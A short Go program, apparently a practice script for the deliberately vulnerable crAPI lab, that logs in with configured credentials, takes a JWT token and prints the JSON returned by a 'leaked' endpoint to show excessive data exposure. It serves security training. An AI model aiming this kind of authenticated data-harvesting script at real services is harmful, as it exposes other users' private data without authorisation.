package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"

	configurator "github.com/tomek-skrond/crapiconfigurator"
)

func main() {
	// read config
	pwd, _ := os.Getwd()
	config, err := configurator.GetConfig(pwd + "/config.json")
	if err != nil {
		log.Fatalln(err)
	}

	// get jwt token
	token := configurator.GetJWTToken(config.LoginURL, config.Email, config.Password)
	if token == "" {
		log.Fatalln("token empty")
	}

	fmt.Println("Leaked endpoint data is:")
	LeakedEndpoint(token, config.TargetURL)
}

func LeakedEndpoint(token, targeturl string) {
	client := configurator.CustomHttpClient()

	req, err := http.NewRequest("GET", targeturl, nil)
	if err != nil {
		log.Println(err)
	}

	req = configurator.ConfigureRequest(req, token)

	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	body, err := configurator.ReadBody(resp)
	if err != nil {
		log.Println(err)
	}

	var prettyJSON bytes.Buffer
	if err := json.Indent(&prettyJSON, body, "", "  "); err != nil {
		log.Println(err)
	}

	fmt.Println(prettyJSON.String())
}
